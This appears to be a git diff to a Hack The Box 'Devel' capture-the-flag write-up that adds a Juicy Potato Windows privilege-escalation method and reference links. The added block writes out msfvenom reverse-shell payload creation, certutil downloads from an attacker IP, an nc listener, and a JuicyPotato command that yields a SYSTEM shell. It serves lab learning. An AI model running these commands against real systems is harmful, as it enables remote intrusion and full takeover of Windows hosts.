@@ -139,6 +139,29 @@ MS11-046.exe
 
 ### Method 3: Juicy Potato
 + Solution **Juicy Potato** [1](https://rizemon.github.io/posts/devel-htb/) [2](https://yogeshwarram-g.gitbook.io/hackthebox/windows/devil#privilege-escalation)
++ **Juicy Potato:** https://github.com/ivanitlearning/Juicy-Potato-x86/releases
++ **CLSID - Windows 7 Enterprise**: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise
++ Check [**for more details**](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/40_Devel.md#for-more).
+
+```
+# On the kali attack vm:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=5555 -f exe > reverse.exe
+
+sudo python3 -m http.server
+
+nc -lnvp 5555
+
+# On the target machine:
+certutil.exe -urlcache -split -f "http://10.10.14.24:8000/reverse.exe" reverse.exe
+
+certutil.exe -urlcache -split -f "http://10.10.14.24:8000/JuicyPotato_x86.exe" JuicyPotato_x86.exe
+
+JuicyPotato_x86.exe -l 5555 -p reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+```
+
+Get the shell as **nt authority\system**.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5a1a8fc1-d563-4fab-8c71-42e8a5e0d8eb)
 
 
 # References & Alternatives
@@ -178,9 +201,19 @@ MS11-046.exe
 
 
 ## Problems Solution
-+ -
++ https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
 
 
 ## For More
-+ **Juicy Potato:** https://github.com/ivanitlearning/Juicy-Potato-x86/releases
-  + https://github.com/ivanitlearning/Juicy-Potato-x86
+- https://github.com/ivanitlearning/Juicy-Potato-x86
+	- https://github.com/ivanitlearning/Juicy-Potato-x86/releases
+	- https://github.com/ohpe/juicy-potato/releases
+	- https://github.com/ohpe/juicy-potato/
+- **CLSID:**
+	- https://ohpe.it/juicy-potato/CLSID/
+	- https://github.com/ohpe/juicy-potato/tree/master/CLSID
+- https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
+	- https://ohpe.it/juicy-potato/
+	- https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/
+	- https://rizemon.github.io/posts/devel-htb/
+	- https://yogeshwarram-g.gitbook.io/hackthebox/windows/devil#privilege-escalation
